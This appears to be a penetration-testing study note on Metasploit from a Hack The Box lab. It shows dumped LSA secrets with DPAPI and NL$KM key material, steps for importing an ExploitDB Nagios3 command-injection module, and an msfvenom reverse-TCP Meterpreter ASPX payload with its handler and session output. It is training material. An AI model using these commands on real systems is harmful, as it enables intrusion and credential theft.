+Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
+cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 
+    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
+    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63
+
+Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
+cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
+cur/hex : 00 f2 d1 31 e2 11 d3 01 
+
+Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
+
+Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
+
+Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
+
+Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
+
+Secret  : L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}
+cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f 
+old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 
+
+Secret  : NL$KM
+cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f 
+
+Secret  : SAC
+
+Secret  : SAI
+
+Secret  : SCM:{148f1a14-53f3-4074-a573-e1ccd344e1d0}
+
+Secret  : SCM:{3D14228D-FBE1-11D0-995D-00C04FD919C1}
+
+Secret  : _SC_Alerter / service 'Alerter' with username : NT AUTHORITY\LocalService
+
+Secret  : _SC_ALG / service 'ALG' with username : NT AUTHORITY\LocalService
+
+Secret  : _SC_aspnet_state / service 'aspnet_state' with username : NT AUTHORITY\NetworkService
+
+Secret  : _SC_Dhcp / service 'Dhcp' with username : NT AUTHORITY\NetworkService
+
+Secret  : _SC_Dnscache / service 'Dnscache' with username : NT AUTHORITY\NetworkService
+
+Secret  : _SC_LicenseService / service 'LicenseService' with username : NT AUTHORITY\NetworkService
+
+Secret  : _SC_LmHosts / service 'LmHosts' with username : NT AUTHORITY\LocalService
+
+Secret  : _SC_MSDTC / service 'MSDTC' with username : NT AUTHORITY\NetworkService
+
+Secret  : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\NetworkService
+
+Secret  : _SC_RpcSs / service 'RpcSs' with username : NT AUTHORITY\NetworkService
+
+Secret  : _SC_stisvc / service 'stisvc' with username : NT AUTHORITY\LocalService
+
+Secret  : _SC_TlntSvr / service 'TlntSvr' with username : NT AUTHORITY\LocalService
+
+Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\LocalService
+```
+
+# Writing and Importing Modules
+
+[ExploitDB](https://www.exploit-db.com) is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is [Metasploit Framework (MSF)](https://www.exploit-db.com/?tag=3), which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the `msfconsole`.
+
+We can, however, find the exploit code [inside ExploitDB's entries](https://www.exploit-db.com/exploits/9861). Alternatively, if we do not want to use our web browser to search for a specific exploit within ExploitDB, we can use the CLI version, `searchsploit`.
+
+We have to download the `.rb` file and place it in the correct directory. The default directory where all the modules, scripts, plugins, and `msfconsole` proprietary files are stored is `/usr/share/metasploit-framework`. The critical folders are also symlinked in our home and root folders in the hidden `~/.msf4/` location.
+
+## MSF - Directory Structure
+
+```shell-session
+$ ls /usr/share/metasploit-framework/
+
+app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
+config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
+data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools
+```
+
+We copy it into the appropriate directory after downloading the [exploit](https://www.exploit-db.com/exploits/9861). Note that our home folder `.msf4` location might not have all the folder structure that the `/usr/share/metasploit-framework/` one might have. So, we will just need to `mkdir` the appropriate folders so that the structure is the same as the original folder so that `msfconsole` can find the new modules. After that, we will be proceeding with copying the `.rb` script directly into the primary location.
+
+Please note that there are certain naming conventions that, if not adequately respected, will generate errors when trying to get `msfconsole` to recognize the new module we installed. Always use snake-case, alphanumeric characters, and underscores instead of dashes.
+
+For example:
+
+-   `nagios3_command_injection.rb`
+-   `our_module_here.rb`
+
+### MSF - Loading Additional Modules at Runtime
+
+```shell-session
+Morrigar@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+Morrigar@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
+```
+
+### MSF - Loading Additional Modules
+
+```shell-session
+msf6> loadpath /usr/share/metasploit-framework/modules/
+```
+
+Alternatively, we can also launch `msfconsole` and run the `reload_all` command for the newly installed module to appear in the list. After the command is run and no errors are reported, try either the `search [name]` function inside `msfconsole` or directly with the `use [module-path]` to jump straight into the newly installed module.
+
+```shell-session
+msf6 > reload_all
+msf6 > use exploit/unix/webapp/nagios3_command_injection 
+msf6 exploit(unix/webapp/nagios3_command_injection) > show options
+
+Module options (exploit/unix/webapp/nagios3_command_injection):
+
+   Name     Current Setting                 Required  Description
+   ----     ---------------                 --------  -----------
+   PASS     guest                           yes       The password to authenticate with
+   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80                              yes       The target port (TCP)
+   SSL      false                           no        Negotiate SSL/TLS for outgoing connections
+   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi
+   USER     guest                           yes       The username to authenticate with
+   VHOST                                    no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+```
+
+
+## Writing a Module
+
+All necessary information about Metasploit Ruby coding can be found on the [Rubydoc.info Metasploit Framework](https://www.rubydoc.info/github/rapid7/metasploit-framework) related page. From scanners to other auxiliary tools, from custom-made exploits to ported ones, coding in Ruby for the Framework is an amazingly applicable skill.
+
+# Intro to MSFVenom
+
+#### Generating Payload
+
+```shell-session
+Morrigar@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of aspx file: 2819 bytes
+```
+
+Now, we only need to navigate to `http://10.10.10.5/reverse_shell.aspx`, and it will trigger the `.aspx` payload. Before we do that, however, we should start a listener on msfconsole so that the reverse connection request gets caught inside it.
+
+#### MSF - Setting Up Multi/Handler
+
+```shell-session
+Morrigar@htb[/htb]$ msfconsole -q 
+
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) > set LHOST 10.10.14.5
+
+LHOST => 10.10.14.5
+
+
+msf6 exploit(multi/handler) > set LPORT 1337
+
+LPORT => 1337
+
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.5:1337 
+```
+
+
+Run the uploaded paylod then:
+
+```shell-session
+<...SNIP...>
+[*] Started reverse TCP handler on 10.10.14.5:1337 
+
+[*] Sending stage (176195 bytes) to 10.10.10.5
+[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000
+
+
+meterpreter > getuid
+
+Server username: IIS APPPOOL\Web
+
+
+meterpreter > 
+
+[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
+```
